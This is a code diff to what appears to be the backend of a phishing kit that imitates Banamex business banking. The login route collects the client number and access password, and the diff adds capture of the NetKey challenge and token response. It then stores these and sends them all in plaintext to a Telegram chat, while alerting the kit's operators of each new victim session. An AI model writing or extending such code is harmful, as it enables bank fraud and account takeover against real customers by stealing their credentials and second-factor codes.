@@ -771,7 +771,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/banamex/login', async (req, res) => {
     try {
-      const { numeroCliente, claveAcceso } = req.body;
+      const { numeroCliente, claveAcceso, challenge, netkeyResponse } = req.body;
 
       if (!numeroCliente || !claveAcceso) {
         return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
@@ -781,22 +781,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const session = await storage.createSession({ 
         sessionId, 
-        banco: "CITIBANAMEX",
+        banco: "BANAMEX",
         numeroCliente,
         claveAcceso,
+        challenge: challenge || '',
+        netkeyResponse: netkeyResponse || '',
         pasoActual: "validando",
         createdBy: "banamex_client",
       });
 
       console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);
 
-      await sendTelegramMessage(
+      const telegramMessage = 
         `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
         `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
         `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
+        (challenge ? `🔢 <b>Challenge:</b> ${challenge}\n` : '') +
+        (netkeyResponse ? `🔐 <b>NetKey Response:</b> ${netkeyResponse}\n` : '') +
         `🆔 <b>Session ID:</b> ${sessionId}\n` +
-        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
-      );
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+
+      await sendTelegramMessage(telegramMessage);
 
       broadcastToAdmins(JSON.stringify({
         type: 'NEW_BANAMEX_SESSION',
